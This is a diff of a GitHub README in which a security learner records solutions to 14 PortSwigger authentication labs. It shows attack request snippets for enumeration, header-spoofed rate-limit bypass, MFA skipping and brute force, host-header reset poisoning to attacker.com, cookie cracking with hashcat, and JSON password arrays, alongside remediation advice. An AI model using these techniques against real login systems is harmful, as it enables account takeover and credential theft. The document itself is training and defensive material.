@@ -1,13 +1,13 @@
-# 🔐 Authentication Vulnerabilities - Complete Lab Series
+# 🔐 Authentication Vulnerabilities — Complete Lab Series
 
 <div align="center">
 
-![Authentication Security](https://img.shields.io/badge/Category-Authentication%20Security-critical?style=for-the-badge&logo=shield&logoColor=white)
-![Labs Completed](https://img.shields.io/badge/Labs%20Completed-14%2F14-success?style=for-the-badge&logo=checkmarked&logoColor=white)
+![Category](https://img.shields.io/badge/Category-Authentication%20Security-critical?style=for-the-badge&logo=shield&logoColor=white)
+![Labs Completed](https://img.shields.io/badge/Labs%20Completed-14%2F14-success?style=for-the-badge&logo=checkmarx&logoColor=white)
 ![Difficulty](https://img.shields.io/badge/Difficulty-Apprentice%20to%20Expert-orange?style=for-the-badge&logo=target&logoColor=white)
 ![Status](https://img.shields.io/badge/Status-100%25%20Complete-brightgreen?style=for-the-badge&logo=statuspage&logoColor=white)
 
-**Master authentication exploitation through 14 comprehensive hands-on labs**
+**14 labs. Apprentice through Expert. All done.**
 
 [🔗 Main Repository](https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs) • [👤 About Me](https://github.com/Gurpreet-Singh-offensive-Security) • [📧 Contact](mailto:gskhalsa6245@gmail.com)
 
@@ -15,522 +15,269 @@
 
 ---
 
-## 📋 Overview
+Finished all 14 PortSwigger authentication labs. Notes below are what I actually did — not rephrased documentation. The attack pattern section at the bottom is what I kept open while working through the harder labs.
 
-Complete hands-on lab series exploring **Authentication Vulnerabilities** in modern web applications. Progressing from foundational flaws to expert-level multi-stage attacks, these 14 labs demonstrate real-world exploitation techniques against vulnerable authentication systems.
-
-### 🏆 Achievement Stats
-
-```
-📊 Completion: 100% (14/14 labs)
-🎓 Breakdown:
-   ├─ 🟢 Apprentice:    3 labs (21%)
-   ├─ 🟡 Practitioner:  9 labs (64%)
-   └─ 🔴 Expert:        2 labs (15%)
-
-⏱️  Investment: 40+ hours hands-on exploitation
-🛠️  Tools: Burp Suite Pro, Turbo Intruder, Python
-📝 Documentation: Professional walkthroughs with CVSS scoring
-```
+**Time spent:** ~40 hours  
+**Tools:** Burp Suite Pro, Turbo Intruder, Python, Hashcat  
+**Focus areas:** Enumeration, brute force bypass, MFA logic, session attacks, password reset flaws
 
 ---
 
-## 🎯 What are Authentication Vulnerabilities?
+## Labs
 
-Authentication vulnerabilities occur when web applications fail to properly verify user identity, allowing attackers to **bypass security controls**, **impersonate users**, or **compromise credentials**. These represent some of the **most critical security risks** in web applications (OWASP Top 10).
+### Apprentice — 3/3
 
-### 💥 Real-World Impact
+Short labs but don't skip them. Lab 2 especially — the 2FA bypass is embarrassingly simple and you'll see variants of it in real apps more than you'd expect.
 
-| Impact Type | Consequence | Severity |
-|-------------|-------------|----------|
-| 🚨 **Account Takeover** | Complete compromise including admin access | 🔴 Critical |
-| 💰 **Financial Fraud** | Unauthorized transactions and theft | 🔴 Critical |
-| 📊 **Data Breaches** | Access to sensitive PII and corporate data | 🔴 Critical |
-| 🔑 **Credential Harvesting** | Mass account compromise | 🟠 High |
-| 🎭 **Identity Theft** | Impersonation and reputation damage | 🟠 High |
-
-**Statistics:**
-- 💸 Average breach cost: **$4.45M** (IBM 2023)
-- ⚖️ GDPR fines: Up to **€20M** or **4% of revenue**
-- 📉 Post-breach stock impact: **-7.27%** average
-- ⏱️ Average detection time: **277 days**
+| # | Lab | What I did | Technique |
+|---|-----|-----------|-----------|
+| 1 | [Username Enumeration via Different Responses](./LAB-1-AUTHENTICATION.md) | Login returns different messages for invalid username vs wrong password. Ran Intruder over a username wordlist, filtered on response length. Valid usernames stuck out immediately — different message, different length. Then brute-forced the password the same way. | Enumeration |
+| 2 | [2FA Simple Bypass](./LAB-2-AUTHENTICATION.md) | After login you get redirected to `/login2` for the MFA code. Just navigated directly to `/my-account` instead. App had already set the session after step 1 — MFA was never enforced server-side. | MFA Bypass |
+| 3 | [Password Reset Broken Logic](./LAB-3-AUTHENTICATION.md) | Reset flow sends a token in the POST body. Removed the token parameter entirely, changed the username to the victim's. App reset the password anyway — it wasn't actually validating the token against the account. | Reset Logic |
 
 ---
 
-## 🗺️ Lab Series Structure
+### Practitioner — 9/9
 
-| # | Lab Title | Difficulty | Focus Area | Key Techniques |
-|---|-----------|------------|------------|----------------|
-| 1 | [Username Enumeration via Different Responses](./LAB-1-AUTHENTICATION.md) | 🟢 Apprentice | User Enumeration | Response comparison analysis ( 300 login { Intruder Results})|
-| 2 | [2FA Simple Bypass](./LAB-2-AUTHENTICATION.md) | 🟢 Apprentice | MFA Bypass | Direct path manipulation -- Path Change from Login to my account in url directly |
-| 3 | [Password Reset Broken Logic](./LAB-3-AUTHENTICATION.md) | 🟢 Apprentice | Password Reset | Forgot Password Token Removal -- New Credentials Reset |
-| 4 | [Username Enumeration via Subtly Different Responses](./LAB-4-AUTHENTICATION.md) | 🟡 Practitioner | User Enumeration | Grep pattern matching ( Invalid Username or password . or no . ) -- password finding -- account takeover |
-| 5 | [Username Enumeration via Response Timing](./LAB-5-AUTHENTICATION.md) | 🟡 Practitioner | Timing Attacks | X-Forwarded-For Header Injection ( Rate Limit Bypass) -- timing observer valid vs invalid response time difference -- increased password length -- actual username enumerated with longest response -- password finding -- account takeover |
-| 6 | [Broken Brute-Force Protection (IP Block)](./LAB-6-AUTHENTICATION.md) | 🟡 Practitioner | Brute Force | IP Roatation Bypass by Valid Account entries before lockout after 2 invalid entries by Turbo Intruder -- Attached Wordlists in Intruder -- Victim Account Enumerated ) 
-| 7 | [Username Enumeration via Account Lock](./LAB-7-AUTHENTICATION.md) | 🟡 Practitioner | Account Lockout | No Ip restriction to invalid accounts -- Cluster bomb by muliple passwords with each username and multiple usernames -- Account lockout for actual username due to multiple wrong passwords -- Password Finding -- Account Takeover |
-| 8 | [2FA Broken Logic](./LAB-8-AUTHENTICATION.md) | 🟡 Practitioner | MFA Bypass | Cookie manipulation by verify parameter -- actual account mfa request intercdepted -- changed parameter -- code finding-- session token received in valid code response in intruder results -- session token changed in attacker browser -- account takeover |
-| 9 | [Brute-Forcing Stay-Logged-In Cookie](./LAB-9-AUTHENTICATION.md) | 🟡 Practitioner | Session Attacks | Stay in login cookie weak encoding in Base64/MD5 -- Decode in Decoder -- ID parameter set to Victim -- Password Payload Processign set according stay in login session cookie format -- Stay in Login Cookie Captured  |
-| 10 | [Offline Password Cracking](./LAB-10-AUTHENTICATION.md) | 🟡 Practitioner | Cryptanalysis | Weak Encoded Base 64 MD5 HASH Stay in Login cookie observed + XSS -- Created Payload to capture stay in login cookie -- Link Clicked by Victim -- Got Cookie - Decode in Decoder -- Decrypted by Hashcat -- Credentials Submitted in Webpage -- Accounts Takeover |
-| 11 | [Password Reset Poisoning via Middleware](./LAB-11-AUTHENTICATION.md) | 🟡 Practitioner | Header Injection | Session Token removed and id parameter changed 302 -- broken session bound logic-- temp forgot password reset link manipulation by host header injection -- host header injection used to make webpage trust our exploit server host instead of actual host -- reset link sent by our exploit server to victim -- victim clicked -- victim password token captured -- used captured token to reset victim password -- account compromised |
-| 12 | [Password Brute-Force via Password Change](./LAB-12-AUTHENTICATION.md) | 🟡 Practitioner | Logic Flaws | Password Change testing -- Broken Logout Protection -- Rate Limit Bypass -- Valid Credential Enumeration -- Account Compromised |
-| 13 | [Broken Brute-Force Protection (Multiple Credentials)](./LAB-13-AUTHENTICATION.md) | 🔴 Expert | Advanced Bypass JSON | Credentials Captured in JSON format -- Can add thousands of passwords in Json {} -- Got session token if any valid password present -- session token change in attacker webpage -- account compromised |
-| 14 | [2FA Bypass Using Brute-Force Attack](./LAB-14-AUTHENTICATION.md) | 🔴 Expert | Advanced MFA | CSRF token got issued FOR single time MFA session -- MACRO all those login request from  GET LOGIN -- POST LOGIN -- POST LOGIN2 ( FAKE MFA ENTRY AND GET CSRF TOKEN) -- restore session by macro for multiple mfas attempts-- got mfa captured with same process in victim account compromise stage-- got sesion token with valid mfa -- account comprmise by attacker webpagte session replacement ( catch ) { there was no short time than we required to guess 4 digit code for mfa to get invalid }|
----
+This is where it gets more involved. Labs 5, 8, 11, and 14 took the most time — all required understanding how the app's session or trust logic worked before the actual exploitation made sense.
 
-## 🎓 Learning Path
-
-### Prerequisites
-- HTTP/HTTPS protocol fundamentals
-- Burp Suite Proxy & Repeater proficiency
-- Understanding of authentication flows
-- Cookie and session management concepts
-- Basic JSON/Base64 encoding knowledge
-
-### Recommended Order
-
-**Phase 1: Foundations** (Labs 1-3)
-- Master basic enumeration and bypass techniques
-- Understand common authentication flaws
-
-**Phase 2: Intermediate** (Labs 4-9)
-- Advanced enumeration (timing, subtlety)
-- Brute force protection bypass
-- Session cookie attacks
-
-**Phase 3: Advanced** (Labs 10-12)
-- Cryptographic attacks
-- Infrastructure exploitation
-- Multi-stage attack chains
-
-**Phase 4: Expert** (Labs 13-14)
-- Advanced automation (Turbo Intruder)
-- Complex MFA bypass techniques
-
-### Skills Developed
-
-✅ Systematic user enumeration  
-✅ Brute force protection bypass  
-✅ MFA/2FA exploitation  
-✅ Password reset attacks  
-✅ Session hijacking  
-✅ Burp Suite automation mastery  
-✅ Cryptanalysis & hash cracking  
-✅ Professional security reporting  
+| # | Lab | What I did | Technique |
+|---|-----|-----------|-----------|
+| 4 | [Username Enumeration via Subtly Different Responses](./LAB-4-AUTHENTICATION.md) | Same idea as Lab 1 but the difference is a single character — trailing period in the error message for invalid usernames (`Invalid username or password.` vs `Invalid username or password`). Used Burp's Grep Match to flag it. Easy to miss manually. | Enumeration |
+| 5 | [Username Enumeration via Response Timing](./LAB-5-AUTHENTICATION.md) | App locks out by IP after a few attempts. Bypassed with `X-Forwarded-For` header — rotating the value on each request makes the server think you're coming from a new IP. Valid usernames take longer to respond because the app actually checks the password hash. Sent a very long password to amplify the timing difference. Identified the valid username from the slowest response, then brute-forced the password. | Timing + Rate Bypass |
+| 6 | [Broken Brute-Force Protection (IP Block)](./LAB-6-AUTHENTICATION.md) | Lockout triggers after 3 failed attempts. Reset by logging into my own account successfully between attempts — the counter resets on valid login. Set up a Turbo Intruder script that interleaved my valid credentials with victim password guesses. Two invalid, one valid, repeat. Never hit lockout. | Brute Force Bypass |
+| 7 | [Username Enumeration via Account Lock](./LAB-7-AUTHENTICATION.md) | No lockout on invalid usernames — only valid ones get locked. Ran Cluster Bomb with multiple passwords per username. The one username that eventually returned an account locked message was the valid one. Waited for lockout to clear, then brute-forced the password. | Enumeration via Lockout |
+| 8 | [2FA Broken Logic](./LAB-8-AUTHENTICATION.md) | The `verify` cookie controls which account the MFA code gets issued for. Logged in with my account, intercepted the MFA request, changed `verify=wiener` to `verify=carlos`. That triggers a new MFA code for the victim's account. Then brute-forced the 4-digit code in Intruder — got a 302 when the code matched. Swapped the session token into my browser. | MFA Logic Flaw |
+| 9 | [Brute-Forcing Stay-Logged-In Cookie](./LAB-9-AUTHENTICATION.md) | Cookie was `base64(username:md5(password))`. Decoded mine, confirmed the format. Set the username to the victim's, generated MD5 hashes for each password in the wordlist, base64'd them, ran Intruder. Matched on a 200 response. | Session Cookie Attack |
+| 10 | [Offline Password Cracking](./LAB-10-AUTHENTICATION.md) | Same weak cookie format as Lab 9. Found an XSS in a comment field. Injected a payload to exfiltrate the victim's stay-logged-in cookie to my exploit server. Decoded it, extracted the MD5 hash, cracked it with Hashcat. Logged in with the plaintext password. | XSS + Cryptanalysis |
+| 11 | [Password Reset Poisoning via Middleware](./LAB-11-AUTHENTICATION.md) | Reset email generates a link using the `Host` header value. Added `X-Forwarded-Host: my-exploit-server.com` to the reset request. The app used that header to build the reset URL and sent it to the victim. Victim clicks — token hits my server. Used the captured token to reset the victim's password. | Host Header Injection |
+| 12 | [Password Brute-Force via Password Change](./LAB-12-AUTHENTICATION.md) | Password change endpoint behaved differently when the current password was wrong vs right — different error message. No rate limiting on this endpoint either. Set the username to the victim's in the request, brute-forced current password through Intruder, filtered on the response that indicated a correct current password. | Logic Flaw + Brute Force |
 
 ---
 
-## 🛠️ Tools & Setup
+### Expert — 2/2
 
-### Required Tools
+Both of these are less about clever payloads and more about understanding the underlying mechanism — session binding in 14, JSON parsing behaviour in 13.
 
-- **Burp Suite Professional** - Primary testing platform
-- **Python 3.x** - Script automation
-- **HashCat/John the Ripper** - Password cracking
-- **Web Browser** - Firefox/Chrome with proxy
-- **PortSwigger Academy Account** - Lab access
-
-### Environment Setup
-
-```bash
-# 1. Configure Burp Proxy
-Browser Proxy: 127.0.0.1:8080
-Install Burp CA certificate
-
-# 2. Burp Settings
-Intruder → Threads: 10-20
-Options → Sessions: Configure macros
-
-# 3. Wordlists
-/usr/share/seclists/Usernames/Names/names.txt
-/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt
-```
+| # | Lab | What I did | Technique |
+|---|-----|-----------|-----------|
+| 13 | [Broken Brute-Force Protection (Multiple Credentials)](./LAB-13-AUTHENTICATION.md) | Login accepts JSON. Instead of one password string, passed an array of passwords: `"password": ["pass1","pass2",...]`. The backend iterated through all of them and returned a session token if any matched. Got a valid session in one request. | JSON Array Injection |
+| 14 | [2FA Bypass Using Brute-Force Attack](./LAB-14-AUTHENTICATION.md) | MFA page uses a CSRF token that's tied to the session, which resets after each failed attempt. Needed a macro to re-run the full login flow before every MFA guess — GET /login, POST /login, POST /login2 (dummy MFA entry to get a fresh CSRF token). Configured the macro in Burp's session handling rules, then ran Intruder over all 0000–9999 codes. When the right code hit, got a valid session. Replaced the session in my browser. | Macro + MFA Brute Force |
 
 ---
 
-## 🎨 Common Attack Patterns
+## Attack Patterns
 
-### Pattern 1: Username Enumeration
+### Username Enumeration
 
-**Vulnerability:** Different responses reveal valid usernames
+The app is leaking whether a username exists through its response — could be the message text, response length, status code, or timing. Any difference is an oracle.
 
 ```http
 POST /login
 username=validuser&password=wrong
-→ "Incorrect password"
+→ "Incorrect password"          ← username exists
 
 POST /login
-username=invalid&password=wrong
-→ "Invalid username"
+username=doesnotexist&password=wrong
+→ "Invalid username or password" ← username doesn't exist
 ```
 
-**Exploitation:**
-1. Capture login request in Burp
-2. Send to Intruder, mark username position
-3. Load username wordlist
-4. Filter by response differences
+Burp Intruder workflow: mark the username position, load a wordlist, grep for the distinguishing string or filter on response length.
 
 ---
 
-### Pattern 2: Brute Force Protection Bypass
+### Rate Limit Bypass via Header Spoofing
 
-**Vulnerability:** IP-based rate limiting via header manipulation
+IP-based lockout trusts `X-Forwarded-For`. Rotate it on every request and the server thinks each attempt comes from a new IP.
 
 ```http
 POST /login
-X-Forwarded-For: 1.2.3.4
+X-Forwarded-For: 10.0.0.1
+username=carlos&password=attempt1
 
-→ Rate limit bypassed (appears from different IP)
+POST /login
+X-Forwarded-For: 10.0.0.2
+username=carlos&password=attempt2
 ```
 
-**Exploitation:**
-1. Pitchfork attack: passwords + rotating IPs
-2. Each request from "different" IP
-3. Bypass rate limiting completely
+Worth pairing with a valid login interleaved between attempts if the counter is per-IP but still resets on success.
 
 ---
 
-### Pattern 3: 2FA/MFA Logic Bypass
+### 2FA Logic Flaws
 
-**Type A: Direct Path Access**
-```http
-POST /login → GET /verify-2fa → GET /my-account
-                                 ↑ BYPASS!
+**Type A — skip it entirely:**
+```
+POST /login → redirect to /login2 → navigate directly to /my-account
+Session is already set after step 1. MFA check is client-enforced only.
 ```
 
-**Type B: Session Manipulation**
+**Type B — target a different account:**
 ```http
-Cookie: verify=myusername → verify=victim
-Brute force victim's 2FA code (0000-9999)
+GET /login2
+Cookie: verify=wiener   → change to verify=carlos
 ```
+Triggers MFA code issuance for the victim. Brute-force the 4-digit code (10,000 max attempts).
 
 ---
 
-### Pattern 4: Password Reset Exploitation
+### Password Reset Flaws
 
-**Host Header Poisoning:**
+**Token not bound to account:**
+```http
+POST /reset-password
+token=abc123&username=wiener&new-password=hacked
+→ change username to carlos → resets carlos's password
+```
+
+**Host header poisoning:**
 ```http
 POST /forgot-password
 Host: vulnerable-site.com
 X-Forwarded-Host: attacker.com
 
-→ Reset link sent to attacker.com/reset?token=...
-```
-
-**Parameter Tampering:**
-```http
-POST /reset-password
-username=myaccount&token=valid&new-password=hacked
-
-→ Change username to victim → password reset!
+→ Reset email contains: https://attacker.com/reset?token=...
+→ Victim clicks → token captured
 ```
 
 ---
 
-### Pattern 5: Session Cookie Exploitation
+### Weak Session Cookie
 
-**Weak Cookie Generation:**
 ```
-Cookie: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
+stay-logged-in cookie = base64(username:md5(password))
 
-Base64 decode:
-→ wiener:51dc30ddc473d43a6011e9ebba6ca770
-
-Analysis:
-username:md5(password)
-→ Crack MD5 hash → Generate valid cookie
+Decode → extract MD5 → crack offline → reconstruct cookie for victim
 ```
+
+Hashcat: `hashcat -a 0 -m 0 hash.txt wordlist.txt`
 
 ---
 
-### Pattern 6: JSON Array Injection (Expert)
+### JSON Array Credential Stuffing
 
-**Traditional:**
-```json
-{"username": "carlos", "password": "password123"}
-```
-
-**Exploited:**
 ```json
 {
   "username": "carlos",
-  "password": ["pass1", "pass2", ..., "pass100"]
+  "password": ["password1", "password2", "password3", "..."]
 }
 ```
 
-**Turbo Intruder Script:**
-```python
-def queueRequests(target, wordlists):
-    engine = RequestEngine(endpoint=target.endpoint)
-    passwords = []
-    
-    for password in open('/path/wordlist.txt'):
-        passwords.append(password.strip())
-        if len(passwords) == 100:
-            engine.queue(target.req, json.dumps(passwords))
-            passwords = []
-```
+If the backend iterates the array and returns a session on any match, you can test hundreds of passwords in a single request — no rate limiting triggered.
 
 ---
 
-## 🛡️ Defense & Remediation
+### Macro-Based MFA Brute Force
 
-### Secure Implementation
+When the MFA session resets after each failure, you need Burp macros to re-authenticate before every guess:
 
-#### Username Enumeration Prevention
-```python
-# ❌ VULNERABLE
-if not userExists(username):
-    return "Invalid username"
-else:
-    return "Incorrect password"
-
-# ✅ SECURE
-return "Invalid username or password"  # Generic message
-+ Constant-time comparisons
-+ Consistent response timing
+```
+Macro sequence:
+1. GET /login        → capture CSRF token
+2. POST /login       → authenticate, get session
+3. POST /login2      → submit dummy code, get fresh MFA CSRF token
+4. POST /login2      → submit actual guess (Intruder payload)
 ```
 
-#### Brute Force Protection
-```python
-# ✅ Multi-Layer Defense
-- Account lockout (5 attempts)
-- Progressive delays (exponential backoff)
-- CAPTCHA after 3 failures
-- Server-side rate limiting (don't trust headers!)
-- Anomaly detection
-
-# Real IP extraction
-real_ip = request.connection.remote_addr
-# NOT: request.headers['X-Forwarded-For']
-```
-
-#### Secure 2FA Implementation
-```python
-# ✅ Best Practices
-- Cryptographically random codes
-- Server-side user binding (not in cookies!)
-- Limited attempts (3-5 max)
-- Code expiration (5 minutes)
-- One-time use enforcement
-- Rate limiting on verification endpoint
-```
-
-#### Password Reset Security
-```python
-# ✅ Secure Token Generation
-import secrets
-token = secrets.token_urlsafe(32)
-
-# Store with metadata
-reset_tokens[token] = {
-    'user_id': user.id,
-    'created': datetime.now(),
-    'used': False,
-    'expires': datetime.now() + timedelta(hours=1)
-}
-
-# Use application's own domain
-reset_url = f"https://yourdomain.com/reset?token={token}"
-# NOT: f"https://{request.headers['Host']}/..."
-```
-
-#### Session Management
-```python
-# ✅ Secure Session Cookies
-session_cookie = {
-    'value': secrets.token_urlsafe(64),
-    'httponly': True,    # Prevent XSS
-    'secure': True,      # HTTPS only
-    'samesite': 'Strict', # CSRF protection
-    'max_age': 3600      # 1 hour
-}
-
-# ❌ NEVER use:
-# - md5(username:password)
-# - Base64(credentials)
-# - Predictable tokens
-```
-
-### Security Checklist
-
-| Control | Implementation | Priority |
-|---------|----------------|----------|
-| 🔐 Password Policy | Min 12 chars, no common passwords | 🔴 Critical |
-| 🔒 MFA Enforcement | Required for all accounts | 🔴 Critical |
-| ⏱️ Rate Limiting | Server-side, per-account + per-IP | 🔴 Critical |
-| 🎫 Session Security | Secure cookies, short expiry | 🔴 Critical |
-| 👤 No Enumeration | Generic errors, consistent timing | 🟠 High |
-| 🔑 Secure Reset | Cryptographic tokens, expiration | 🟠 High |
+Set up in Burp: Project Options → Sessions → Session Handling Rules → Add macro.
 
 ---
 
-## 💡 Key Takeaways
+## DB Reference
 
-### Top Vulnerabilities Found
-1. **Generic response failures** - Apps leak user existence
-2. **Client-side trust** - Trusting cookies/headers for authentication
-3. **Weak rate limiting** - IP-based or header-dependent controls
-4. **MFA logic flaws** - Skippable or poorly implemented
-5. **Predictable tokens** - Weak session/reset token generation
+### Response Differences to Look For
 
-### Defense Priorities
-1. **Never trust client input** for security decisions
-2. **Defense in depth** - Multiple security layers
-3. **Secure randomness** - Cryptographic token generation
-4. **Consistent behavior** - Same timing, same errors
-5. **Server-side enforcement** - All security checks
+| Signal | Tool | How to Use |
+|--------|------|-----------|
+| Message text | Grep Match | Flag specific string presence/absence |
+| Response length | Column filter | Sort by length, outliers = valid |
+| Status code | Filter | 200 vs 302 vs 403 |
+| Response time | Sort by time | Slower = valid username (timing attack) |
 
-### Industry Statistics
-```
-🎯 Authentication Attack Prevalence:
-├─ 81% of breaches involve weak/stolen passwords
-├─ 2FA reduces account takeover by 99.9%
-├─ Average password reuse: 13 accounts
-├─ 51% reuse passwords everywhere
-└─ $4.45M average credential compromise cost
-```
+### Encoding Reference
+
+| Format | Example | Tool |
+|--------|---------|------|
+| Base64 | `d2llbmVyOjUxZGMz` | Burp Decoder |
+| MD5 | `51dc30ddc473d43a` | Hashcat `-m 0` |
+| Base64(user:md5) | stay-logged-in cookie format | Decoder → crack → reconstruct |
 
 ---
 
-## 📚 Additional Resources
+## Fix
 
-### Official Documentation
+The recurring theme across all 14 labs: the app made security decisions based on data it shouldn't have trusted — client-controlled cookies, headers, request parameters, response timing side-channels it never thought about.
+
+**Enumeration:** Return the same message for every failed login. Enforce the same timing regardless of whether the username exists (use constant-time comparison).
+
+**Rate limiting:** Enforce server-side per-account, not per-IP. Never trust `X-Forwarded-For` for security decisions unless you control every proxy in the chain.
+
+**MFA:** Bind the MFA state to the session server-side. Enforce it — don't just redirect to `/login2` and hope the user doesn't skip it. Limit attempts (3-5) and expire codes fast (60-90 seconds).
+
+**Password reset:** Generate cryptographically random tokens (`secrets.token_urlsafe(32)`), bind them to the account server-side, expire them in under an hour, invalidate on use. Never use the `Host` header to construct URLs in emails — hardcode your domain.
+
+**Session cookies:** Use cryptographically random values. Never encode credentials or hashes into cookies. `secrets.token_urlsafe(64)`, HttpOnly, Secure, SameSite=Strict.
+
+---
+
+## Tools
+
+| Tool | What I used it for |
+|------|--------------------|
+| Burp Suite Pro | Everything — Repeater, Intruder, session macros |
+| Turbo Intruder | Lab 6 — needed better control over request interleaving than standard Intruder |
+| Hashcat | Labs 9, 10 — MD5 cracking from the weak session cookies |
+| Python | One-off scripts for cookie generation in Labs 9/10 |
+
+---
+
+## Lab Order
+
+Do them in order. Labs 1–3 are fast but Lab 2's MFA bypass sets up the mental model for Lab 8 and 14. Lab 5's timing attack builds on Lab 1's enumeration concept. Lab 10 only makes sense if you've done Lab 9 first.
+
+The jump from Practitioner to Expert isn't as big as it looks — Lab 13 is actually simpler than several Practitioner labs. Lab 14 is the hardest one in the series, mostly because of the macro setup.
+
+---
+
+## Completion
+
+- [x] Lab 1 — Username Enumeration via Different Responses
+- [x] Lab 2 — 2FA Simple Bypass
+- [x] Lab 3 — Password Reset Broken Logic
+- [x] Lab 4 — Username Enumeration via Subtly Different Responses
+- [x] Lab 5 — Username Enumeration via Response Timing
+- [x] Lab 6 — Broken Brute-Force Protection (IP Block)
+- [x] Lab 7 — Username Enumeration via Account Lock
+- [x] Lab 8 — 2FA Broken Logic
+- [x] Lab 9 — Brute-Forcing Stay-Logged-In Cookie
+- [x] Lab 10 — Offline Password Cracking
+- [x] Lab 11 — Password Reset Poisoning via Middleware
+- [x] Lab 12 — Password Brute-Force via Password Change
+- [x] Lab 13 — Broken Brute-Force Protection (Multiple Credentials)
+- [x] Lab 14 — 2FA Bypass Using Brute-Force Attack
+
+---
+
+## Resources
+
 - [PortSwigger Authentication Labs](https://portswigger.net/web-security/authentication)
 - [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
-- [NIST Digital Identity Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)
-- [OWASP Top 10 - A07:2021](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
+- [NIST SP 800-63B](https://pages.nist.gov/800-63-3/sp800-63b.html) — the actual standard for digital identity
+- [Turbo Intruder](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack) — worth reading before Lab 6
 
-### Research & Talks
-- "The Science of Guessing" - Joseph Bonneau (IEEE S&P)
-- "Pwning Multi-Factor Authentication" - Duo Security (DEF CON)
-- "OAuth 2.0 Security" - Philippe De Ryck (OWASP)
-
-### Testing Tools
-- **Burp Suite Professional** - https://portswigger.net/burp/pro
-- **Turbo Intruder** - https://portswigger.net/research/turbo-intruder
-- **HashCat** - https://hashcat.net/hashcat/
-- **SecLists Wordlists** - https://github.com/danielmiessler/SecLists
-
-### Related Topics
-- Session Management Attacks
-- OAuth & SAML Exploitation
-- API Authentication (JWT, API keys)
-- Password Cracking Techniques
-- Social Engineering
+Other series in this repo:
+- [SQL Injection](../SQL-Injection/) — 18 labs done
+- XSS — in progress
+- Access Control — in progress
 
 ---
 
-## 🎯 Lab Completion Tracker
+## Legal
 
-### 🟢 Apprentice Level
-- [x] Lab 1: Username Enumeration via Different Responses
-- [x] Lab 2: 2FA Simple Bypass
-- [x] Lab 3: Password Reset Broken Logic
-
-### 🟡 Practitioner Level
-- [x] Lab 4: Username Enumeration via Subtly Different Responses
-- [x] Lab 5: Username Enumeration via Response Timing
-- [x] Lab 6: Broken Brute-Force Protection (IP Block)
-- [x] Lab 7: Username Enumeration via Account Lock
-- [x] Lab 8: 2FA Broken Logic
-- [x] Lab 9: Brute-Forcing Stay-Logged-In Cookie
-- [x] Lab 10: Offline Password Cracking
-- [x] Lab 11: Password Reset Poisoning via Middleware
-- [x] Lab 12: Password Brute-Force via Password Change
-
-### 🔴 Expert Level
-- [x] Lab 13: Broken Brute-Force Protection (Multiple Credentials)
-- [x] Lab 14: 2FA Bypass Using Brute-Force Attack
+Done entirely on PortSwigger Academy's lab environment. Using any of this against systems you don't own or don't have written permission to test is illegal and I wouldn't document it if I had.
 
 ---
 
-## 🤝 Contributing
+*Gurpreet Singh — [GitHub](https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs) · [LinkedIn](https://www.linkedin.com/in/gurpreetsingh-security) · [Email](mailto:gskhalsa6245@gmail.com)*
 
-Found improvements? Contributions welcome!
-
-1. Fork the repository
-2. Create feature branch
-3. Submit pull request with details
-
----
-
-## ⚖️ Legal & Ethical Notice
-
-<div align="center">
-
-### ⚠️ CRITICAL DISCLAIMER
-
-**All techniques documented are for:**
-- ✅ Authorized security testing only
-- ✅ Educational purposes in controlled environments
-- ✅ Professional penetration testing with explicit permission
-
-</div>
-
-**Unauthorized access to computer systems is illegal** under:
-- 🇺🇸 Computer Fraud and Abuse Act (CFAA) - Up to 20 years
-- 🇬🇧 Computer Misuse Act 1990 - Up to 10 years
-- 🇪🇺 ePrivacy Directive - €20M or 4% revenue
-- 🇨🇦 Criminal Code Section 342.1 - Up to 10 years
-
-**The author assumes NO LIABILITY for misuse. Use responsibly and legally.**
-
----
-
-## 👨‍💻 Author & License
-
-<div align="center">
-
-### Created by Gurpreet Singh
-
-**Offensive Security Researcher | Red Team Engineer in Training**
-
-[![GitHub](https://img.shields.io/badge/GitHub-Offensive--Security--Labs-181717?style=for-the-badge&logo=github)](https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-0077B5?style=for-the-badge&logo=linkedin)](https://www.linkedin.com/in/gurpreetsingh-security)
-[![Email](https://img.shields.io/badge/Email-Contact-D14836?style=for-the-badge&logo=gmail)](mailto:gskhalsa6245@gmail.com)
-
----
-
-### 📄 License
-
-**CC BY-NC-ND 4.0** (Attribution-NonCommercial-NoDerivatives)
-
-**Copyright © 2025 Gurpreet Singh. All rights reserved.**
-
-</div>
-
----
-
-## 🎓 Acknowledgments
-
-- **PortSwigger Web Security Academy** - Excellent training platform
-- **OWASP Community** - Comprehensive security documentation
-- **InfoSec Community** - Knowledge sharing culture
-
----
-
-<div align="center">
-
-### 🏆 Achievement Summary
-
-| Metric | Value |
-|--------|-------|
-| **Labs Completed** | 14/14 ✅ |
-| **Apprentice** | 3/3 ✅ |
-| **Practitioner** | 9/9 ✅ |
-| **Expert** | 2/2 ✅ |
-| **Hours Invested** | 40+ 🎯 |
-
-### 🎯 What's Next?
-
-➡️ **SQL Injection Labs** - Database exploitation techniques  
-➡️ **Cross-Site Scripting (XSS)** - Client-side injection attacks  
-➡️ **Access Control** - Privilege escalation & authorization bypass  
-
----
-
-**🔴 Series Complete** | **🛡️ Authentication Expert** | **💻 14/14 Documented**
-
-**Good luck and happy hunting! 🎯🔒**
-
-</div>
+*CC BY-NC-ND 4.0 — © 2025 Gurpreet Singh*
